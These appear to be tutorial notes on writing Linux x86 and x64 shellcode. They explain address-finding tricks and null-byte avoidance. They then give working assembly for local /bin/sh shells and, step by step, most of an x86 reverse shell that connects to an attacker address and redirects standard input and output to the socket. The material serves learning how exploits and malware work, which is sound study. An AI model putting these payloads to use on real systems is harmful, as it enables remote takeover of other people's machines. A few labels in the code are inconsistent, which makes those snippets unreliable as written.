This code gets executed in very special conditions without a PE header, known memory addresses, or
an import

**Linux shellcode in x86-64**

The main challenges that attackers face are as follows:
Getting the absolute address of the shellcode (to be able to access data)
Removing any null byte that can be produced from the shellcode (optional)

**Getting the absolute address**
Here, the shellcode abuses the call instruction, which takes a
relative address to where it should branch to and saves the absolute return address in the
stack(gotten by popping the stack)

After getting the absolute address, the shellcode can get the address of any data inside the shellcode, like so:

call next_ins:
next_ins:
pop eax ;now eax has the absolute address to next_ins
add eax, data_sec – next_ins ;here, eax has the address to data section
data_sec:
db ‘Hello, World',0

common way to get the absolute address is by using the FPU instruction fstenv, saves some parameters related to the FPU, including the absolute address of the last executed FPU instruction.

**Null-free shellcode**
Null-free shellcode is a type of shellcode that has to avoid any null byte to be able to fit a null-terminated string buffer

**Local shell shellcode**

simple example that spawns a shell:

x86

Spawns a shell
start:
xor ecx,ecx
xor eax,eax
pop ebx ; Load /bin/sh in ebx
mov al, 11 ; execve syscall ID
xor ecx,ecx ; no arguments in ecx
int 0x80 ; syscall
mov al, 1 ; exit syscall ID
xor ebx,ebx ; no errors
int 0x80 ; syscall
_end:
call _start
db '/bin/sh',0

x64
xor rdx, rdx
push rdx ;null bytes after the /bin/sh
mov rax, 0x68732f2f6e69622f ;/bin/sh
push rax
mov rdi, rsp
push rdx ;null arguments for /bin/sh
push rdi
mov rsi, rsp
xor rax, rax
mov al, 0x3b ;execve system call
syscall
xor rdi, rdi
mov rax, 0x3c ;exit system call
syscall

**Reverse shell shellcode**
most widely used types of shellcode. This shellcode connects to the attacker and provides them with a shell on the remote system

Create a socket: The shellcode needs to create a socket to connect to the internet. The system call that could be used for this purpose is socket

int socket(int domain, int type, int protocol);

xor edx,edx ;cleanup edx
push edx ;protocol=IPPROTO_IP (0x0)
push 0x1 ;socket_type=SOCK_STREAM (0x1)
push 0x2 ;socket_family=AF_INET (0x2)
mov ecx, esp ;pointer to socket() args
xor ebx,ebx
mov bl, 0x1 ;SYS_SOCKET
xor eax,eax
mov al, 0x66 ;socketcall syscall ID
int 0x80
xchg edx, eax ;edx=sockfd (the returned socket)

shellcode uses the socketcall system call (with ID 0x66)

represents many system calls, including socket, connect, listen, bind

SYS_SOCKET 1
SYS_BIND 2
SYS_CONNECT 3
SYS_LISTEN 4
SYS_ACCEPT 5


Connect to the attacker: In this step, the shellcode connects to the attacker using its IP and port. The shellcode fills a structure called sockaddr_in with the IP, port, and again AF_INET. Then, the shellcode executes the connect function from the socketcall list of functions

push 0x0101017f ;sin_addr=127.1.1.1 (network byte order)
xor ecx, ecx
mov cx, 0x3905
push cx ;sin_port=1337 (network byte order)
inc ebx
push bx ;sin_family=AF_INET (0x2)
mov ecx, esp ;save pointer to sockaddr struct
push 0x10 ;addrlen=16
push ecx ;pointer to sockaddr
push edx ;sockfd
mov ecx, esp ;save pointer to sockaddr_in struct
inc ebx ;sys_connect (0x3)
int 0x80 ;exec sys_connect

Redirect STDIN, STDOUT, and STDERR to socket: Before the shellcode
provides the shell to the user, it needs to redirect any output or error messages
from any program to the socket (to be sent to the attacker) and redirect any input
from the attacker to the running program

push 0x2
pop ecx ;set loop counter
xchg ebx,edx ;save sockfd
; loop through three sys_dup2 calls to redirect stdin(0),
stdout(1) and stderr(2)
loop:
mov al, 0x3f ;sys_dup2 systemcall ID
int 0x80
dec ecx ;decrement loop-counter
jns loop ;as long as SF is not set -> jmp to loop

Execute the shell: This is the last step, where the shellcode executes the execve call with /bin/sh